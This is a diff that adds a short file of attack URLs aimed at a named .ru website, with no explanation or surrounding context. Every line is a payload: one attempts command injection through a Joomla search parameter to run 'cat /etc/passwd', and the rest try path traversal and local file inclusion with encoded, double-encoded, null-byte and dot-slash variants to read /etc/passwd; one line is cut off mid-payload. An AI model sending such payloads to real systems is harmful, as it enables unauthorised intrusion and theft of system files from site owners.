@@ -1,0 +1,10 @@
+
+http://resultforyou.ru//index.php?option=com_search&Itemid=1&searchword=%22%3Bsystem(cat%20/etc/passwd)%3B
+http://resultforyou.ru///index.php?page=../../../etc/passwd
+http://resultforyou.ru///index.php?page=%252e%252e%252fetc%252fpasswd
+http://resultforyou.ru///index.php?page=../../../etc/passwd%00
+http://resultforyou.ru///index.php?page=%252e%252e%252fetc%252fpasswd%00
+http://resultforyou.ru///index.php?page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD
+http://resultforyou.ru///index.php?page=....//....//etc/passwd
+http://resultforyou.ru///index.php?page=..///////..////..//////etc/passwd
+http://resultforyou.ru///index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
